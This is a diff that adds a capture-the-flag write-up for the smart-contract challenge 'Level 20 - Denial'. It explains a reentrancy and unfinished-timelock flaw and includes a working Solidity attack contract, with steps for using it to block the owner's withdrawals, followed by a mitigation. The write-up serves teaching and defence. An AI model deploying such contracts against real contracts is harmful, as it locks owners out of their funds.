@@ -1,0 +1,60 @@
+---
+title: Level 20 - Denial
+slug: level-20
+published: 05-21-2023
+lastEdited:
+---
+
+## Objectives
+
+1. Prevent the owner from calling `withdraw` even when the contract has a positive balance.
+
+## Vulnerabilities
+
+### Reentrancy
+
+The withdraw function is vulnerable to reentrancy attacks. A timelock logic seems to be started
+but not implemented completely. We can exploit this fact by making a _hack_ contract become a
+withdraw partner.
+
+## Exploit
+
+1. Write and deploy a hacking contract like the following:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IDenial {
+    function setWithdrawPartner(address) external;
+    function withdraw() external;
+    function contractBalance() external returns(uint);
+}
+
+contract DenialHack {
+    IDenial target;
+
+    constructor(address payable _targetAddress) {
+        target = IDenial(_targetAddress);
+    }
+
+    receive() external payable {
+        if(address(target).balance > 0){
+            target.withdraw();
+        } else {}
+    }
+}
+```
+
+2. Call `setWithdrawPartner` with the hacking contract's address as argument.
+
+3. When the owner call withdraw, he will not receive any of it's eth.
+
+## Suggested mitigation
+
+1. Completing the timelock logic to one withdraw per hour, per day or whatever else increment of time would prevent this issue from happening.
+
+## Further reading
+
+- Timelock example. <ExternalLink href={"https://solidity-by-example.org/app/time-lock/"} />
+- Reentrancy guard by OpenZeppelin <ExternalLink href={"https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard"} />
